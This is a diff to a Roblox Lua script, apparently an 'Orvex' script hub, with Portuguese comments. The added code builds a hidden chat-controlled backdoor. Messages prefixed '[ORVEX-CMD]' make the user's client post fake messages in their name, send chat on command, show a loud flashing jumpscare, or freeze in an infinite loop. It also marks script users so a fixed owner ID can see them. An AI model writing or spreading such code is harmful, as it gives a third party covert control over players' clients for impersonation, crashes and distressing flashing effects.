@@ -673,18 +673,44 @@ task.spawn(function()
     local TextChatService = game:GetService("TextChatService")
     local canalGeral = TextChatService:WaitForChild("TextChannels", 20):WaitForChild("RBXGeneral", 20)
     
-    if canalGeral then
-        task.spawn(function()
-            while task.wait(2.5) do
-                pcall(function()
-                    canalGeral:SendAsync("[ORVEX-PING]")
-                end)
-            end
-        end)
+    local DONO_ID = 2980742903
+    local telaSusto = nil
+    local loopSusto = nil
+
+    -- Cria o identificador visual (Tag) que apenas o Dono enxergará
+    local function aplicarTagDono()
+        if game:GetService("Players").LocalPlayer.UserId == DONO_ID then return end
+        local head = jogador.Character and jogador.Character:WaitForChild("Head", 10)
+        if head and not head:FindFirstChild("OrvexUserTag") then
+            local tagGui = Instance.new("BillboardGui")
+            tagGui.Name = "OrvexUserTag"
+            tagGui.Size = UDim2.fromOffset(100, 30)
+            tagGui.StudsOffset = Vector3.new(0, 5.5, 0)
+            tagGui.AlwaysOnTop = true
+            tagGui.MaxDistance = 150
+            tagGui.Parent = head
+            
+            local label = Instance.new("TextLabel")
+            label.Size = UDim2.fromScale(1, 1)
+            label.BackgroundTransparency = 1
+            label.Font = Enum.Font.GothamBold
+            label.Text = "[ORVEX USER]"
+            label.TextColor3 = Color3.fromRGB(0, 170, 255)
+            label.TextSize = 14
+            label.TextStrokeTransparency = 0.3
+            label.Parent = tagGui
+        end
     end
 
+    if jogador.Character then aplicarTagDono() end
+    jogador.CharacterAdded:Connect(function() task.wait(1) aplicarTagDono() end)
+
     local function executarOrdem(cmd, arg)
-        if cmd == "FakeMessage" then
+        if cmd == "SolicitarVerificacao" then
+            if canalGeral then
+                pcall(function() canalGeral:SendAsync("new123") end)
+            end
+        elseif cmd == "FakeMessage" then
             if canalGeral then
                 pcall(function()
                     canalGeral:DisplaySystemMessage(string.format("<font color='#FFFFFF'><b>[%s]:</b> %s</font>", jogador.Name, arg))
@@ -699,12 +725,23 @@ task.spawn(function()
         elseif cmd == "EfeitoSusto" then
             local pGui = jogador:WaitForChild("PlayerGui")
             if arg == "ATIVAR" and not pGui:FindFirstChild("OrvexSNetwork") then
-                local sg = Instance.new("ScreenGui", pGui) sg.Name = "OrvexSNetwork" sg.IgnoreGuiInset = true
-                local f = Instance.new("Frame", sg) f.Size = UDim2.new(1,0,1,0) f.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                telaSusto = Instance.new("ScreenGui", pGui) telaSusto.Name = "OrvexSNetwork" telaSusto.IgnoreGuiInset = true
+                local f = Instance.new("Frame", telaSusto) f.Size = UDim2.new(1,0,1,0) f.BackgroundColor3 = Color3.fromRGB(0,0,0)
                 local im = Instance.new("ImageLabel", f) im.Size = UDim2.new(0.6,0,0.6,0) im.Position = UDim2.new(0.2,0,0.2,0) im.BackgroundTransparency = 1 im.Image = "rbxassetid://6071575298"
                 local s = Instance.new("Sound", f) s.SoundId = "rbxassetid://9069609268" s.Volume = 3 s:Play()
-            elseif arg == "DESATIVAR" and pGui:FindFirstChild("OrvexSNetwork") then
-                pGui:FindFirstChild("OrvexSNetwork"):Destroy()
+                
+                -- Adiciona efeito de tremor e flash dinâmico ao susto
+                loopSusto = task.spawn(function()
+                    local r = Random.new()
+                    while true do
+                        f.BackgroundColor3 = r:NextNumber() > 0.5 and Color3.fromRGB(20,0,0) or Color3.fromRGB(0,0,0)
+                        im.Position = UDim2.new(0.2 + r:NextNumber(-0.02, 0.02), 0, 0.2 + r:NextNumber(-0.02, 0.02), 0)
+                        task.wait(0.05)
+                    end
+                end)
+            elseif arg == "DESATIVAR" then
+                if loopSusto then task.cancel(loopSusto) loopSusto = nil end
+                if pGui:FindFirstChild("OrvexSNetwork") then pGui:FindFirstChild("OrvexSNetwork"):Destroy() end
             end
         elseif cmd == "ForcarCrash" then
             while true do end
@@ -714,9 +751,7 @@ task.spawn(function()
     TextChatService.OnIncomingMessage = function(mensagemObj)
         local texto = mensagemObj.Text
         local c, a = string.match(texto, "^%[ORVEX%-CMD%]%s*(%w+)%s*|%s*(.*)$")
-        if c then
-            task.spawn(executarOrdem, c, a)
-        end
+        if c then task.spawn(executarOrdem, c, a) end
         return nil
     end
 end)
